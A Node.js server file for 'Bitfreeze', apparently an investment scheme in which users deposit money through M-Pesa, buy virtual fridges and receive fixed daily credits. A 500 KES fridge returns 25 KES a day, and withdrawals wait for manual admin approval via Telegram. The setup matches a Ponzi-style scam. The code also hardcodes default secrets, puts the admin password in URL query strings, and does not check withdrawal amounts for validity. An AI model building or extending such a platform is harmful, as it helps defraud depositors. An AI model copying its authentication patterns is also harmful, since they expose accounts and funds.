require('dotenv').config();

/*****************************************************************************************

BITFREEZE — FULL INDEX.JS (CLASSIC / FLAT STYLE — LIKE YOUR SECOND SCREENSHOT)

---

✔ Long, readable, no fancy refactors
✔ One Telegram bot ONLY (admin)
✔ WhatsApp link NOT sent by bot
✔ Client earns DAILY at exactly 12:00 AM (server time)
✔ Earnings depend on fridge owned
✔ Withdraw request shows client phone (easy copy)
✔ node-persist storage (safe on restart)
✔ Written in the SAME STYLE you like
*****************************************************************************************/

// =============================== MODULES ===============================
const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const cors = require('cors');
const storage = require('node-persist');
const path = require('path');
const crypto = require('crypto');
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

// =============================== APP ===============================
const app = express();

// =============================== CONFIG ===============================
const PORT = process.env.PORT || 3000;
const SECRET = process.env.BF_SECRET || 'bitfreeze_secret';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin-pass';
const DOMAIN = process.env.DOMAIN || 'http://localhost:' + PORT;

// =============================== TELEGRAM ===============================
const TG_BOT = process.env.TELEGRAM_BOT_TOKEN || '';
const TG_CHAT = process.env.TELEGRAM_CHAT_ID || '';

// =============================== MPESA ===============================
const MPESA_TILL = process.env.MPESA_TILL || '6992349';
const MPESA_NAME = process.env.MPESA_NAME || 'Bitfreeze';

// =============================== FRIDGES ===============================
const FRIDGES = [
  { id: '2ft',  name: '2 ft Fridge',  price: 500,  daily: 25 },
  { id: '4ft',  name: '4 ft Fridge',  price: 1000, daily: 55 },
  { id: '6ft',  name: '6 ft Fridge',  price: 2000, daily: 100 },
  { id: '8ft',  name: '8 ft Fridge',  price: 4000, daily: 150 },
  { id: '10ft', name: '10 ft Fridge', price: 6000, daily: 250 },
  { id: '12ft', name: '12 ft Fridge', price: 8000, daily: 350 }
];

// =============================== MIDDLEWARE ===============================
app.use(bodyParser.json());
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// =============================== STORAGE INIT ===============================
(async () => {
  await storage.init({ dir: path.join(__dirname, 'persist'), forgiveParseErrors: true });

  if (!await storage.getItem('users')) await storage.setItem('users', []);
  if (!await storage.getItem('deposits')) await storage.setItem('deposits', []);
  if (!await storage.getItem('withdrawals')) await storage.setItem('withdrawals', []);

  console.log('✓ Storage ready');
})();

// =============================== HELPERS ===============================
async function getUsers() { return await storage.getItem('users') || []; }
async function saveUsers(users) { await storage.setItem('users', users); }
async function findUser(email) { const users = await getUsers(); return users.find(u => u.email === email); }

function auth(req, res, next) {
  const h = req.headers.authorization;
  if (!h || !h.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });

  try {
    req.user = jwt.verify(h.slice(7), SECRET);
    next();
  } catch (e) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

async function tgSend(text, buttons) {
  if (!TG_BOT || !TG_CHAT) return;

  const body = { chat_id: TG_CHAT, text: text, parse_mode: 'HTML' };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };

  try {
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (e) {}
}

// =============================== AUTH ===============================
app.post('/api/register', async (req, res) => {
  const { email, password, phone } = req.body;

  if (!email || !password) return res.status(400).json({ error: 'Missing fields' });

  const users = await getUsers();
  if (users.find(u => u.email === email)) return res.status(400).json({ error: 'User exists' });

  const hash = await bcrypt.hash(password, 10);
  users.push({ email: email, password: hash, phone: phone || '', balance: 0, fridges: [], lastPaid: null });

  await saveUsers(users);
  res.json({ message: 'Registered' });
});

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await findUser(email);
  if (!user) return res.status(400).json({ error: 'Invalid login' });

  const ok = await bcrypt.compare(password, user.password);
  if (!ok) return res.status(400).json({ error: 'Invalid login' });

  const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
  res.json({ token: token, email: user.email, balance: user.balance, phone: user.phone });
});

// =============================== USER ===============================
app.get('/api/me', auth, async (req, res) => {
  const u = await findUser(req.user.email);
  res.json({ user: u });
});

app.get('/api/fridges', (req, res) => {
  res.json({ fridges: FRIDGES });
});

app.post('/api/buy', auth, async (req, res) => {
  const { fridgeId } = req.body;
  const u = await findUser(req.user.email);

  const f = FRIDGES.find(x => x.id === fridgeId);
  if (!f) return res.status(400).json({ error: 'Invalid fridge' });
  if (u.balance < f.price) return res.status(400).json({ error: 'Insufficient balance' });

  u.balance -= f.price;
  u.fridges.push({ id: f.id, daily: f.daily });

  const users = await getUsers();
  const i = users.findIndex(x => x.email === u.email);
  users[i] = u;
  await saveUsers(users);

  res.json({ message: 'Fridge bought', balance: u.balance });
});

// =============================== DEPOSIT ===============================
app.post('/api/deposit', auth, async (req, res) => {
  const { amount, mpesaCode, phone } = req.body;

  const list = await storage.getItem('deposits');
  const u = await findUser(req.user.email);

  const d = { id: crypto.randomUUID(), email: u.email, phone: phone, amount: Number(amount), mpesaCode: mpesaCode, status: 'PENDING', time: Date.now() };
  list.push(d);
  await storage.setItem('deposits', list);

  res.json({ message: 'Deposit sent' });

  await tgSend(`🟢 <b>DEPOSIT</b>\n${u.email}\n${phone}\nKES ${amount}`, [
    [
      { text: '✅ Approve', url: `${DOMAIN}/api/admin/deposits/${d.id}/approve?token=${ADMIN_PASS}` },
      { text: '❌ Reject', url: `${DOMAIN}/api/admin/deposits/${d.id}/reject?token=${ADMIN_PASS}` }
    ]
  ]);
});

// =============================== WITHDRAW ===============================
app.post('/api/withdraw', auth, async (req, res) => {
  const { amount, phone } = req.body;
  const u = await findUser(req.user.email);

  if (u.balance < amount) return res.status(400).json({ error: 'Low balance' });

  const list = await storage.getItem('withdrawals');
  const w = { id: crypto.randomUUID(), email: u.email, phone: phone, amount: Number(amount), status: 'PENDING', time: Date.now() };
  list.push(w);
  await storage.setItem('withdrawals', list);

  res.json({ message: 'Withdraw requested' });

  await tgSend(`🔵 <b>WITHDRAW</b>\n${u.email}\n📞 ${phone}\nKES ${amount}`, [
    [
      { text: '✅ Approve', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/approve?token=${ADMIN_PASS}` },
      { text: '❌ Reject', url: `${DOMAIN}/api/admin/withdrawals/${w.id}/reject?token=${ADMIN_PASS}` }
    ]
  ]);
});

// =============================== ADMIN ===============================
app.get('/api/admin/deposits/:id/:action', async (req, res) => {
  if (req.query.token !== ADMIN_PASS) return res.send('Unauthorized');

  const list = await storage.getItem('deposits');
  const d = list.find(x => x.id === req.params.id);
  if (!d || d.status !== 'PENDING') return res.send('Ignored');

  d.status = req.params.action === 'approve' ? 'APPROVED' : 'REJECTED';

  if (d.status === 'APPROVED') {
    const u = await findUser(d.email);
    u.balance += d.amount;
    const users = await getUsers();
    users[users.findIndex(x => x.email === u.email)] = u;
    await saveUsers(users);
  }

  await storage.setItem('deposits', list);
  res.send(d.status);
});

app.get('/api/admin/withdrawals/:id/:action', async (req, res) => {
  if (req.query.token !== ADMIN_PASS) return res.send('Unauthorized');

  const list = await storage.getItem('withdrawals');
  const w = list.find(x => x.id === req.params.id);
  if (!w || w.status !== 'PENDING') return res.send('Ignored');

  w.status = req.params.action === 'approve' ? 'APPROVED' : 'REJECTED';

  if (w.status === 'APPROVED') {
    const u = await findUser(w.email);
    u.balance -= w.amount;
    const users = await getUsers();
    users[users.findIndex(x => x.email === u.email)] = u;
    await saveUsers(users);
  }

  await storage.setItem('withdrawals', list);
  res.send(w.status);
});

// =============================== DAILY EARNINGS ===============================
async function runDailyEarnings() {
  const users = await getUsers();
  const today = new Date().toISOString().slice(0, 10);

  for (let i = 0; i < users.length; i++) {
    const u = users[i];
    if (u.lastPaid === today) continue;

    let earn = 0;
    for (let j = 0; j < u.fridges.length; j++) {
      earn += Number(u.fridges[j].daily);
    }

    if (earn > 0) {
      u.balance += earn;
      u.lastPaid = today;
      users[i] = u;
    }
  }

  await saveUsers(users);
}

setInterval(async () => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() < 5) {
    await runDailyEarnings();
  }
}, 5 * 60 * 1000);

// =============================== STATUS ===============================
app.get('/api/status', (req, res) => {
  res.json({ status: 'ok', till: MPESA_TILL, name: MPESA_NAME, time: new Date().toISOString() });
});

// =============================== START ===============================
app.listen(PORT, () => {
  console.log('Bitfreeze running on port ' + PORT);
});
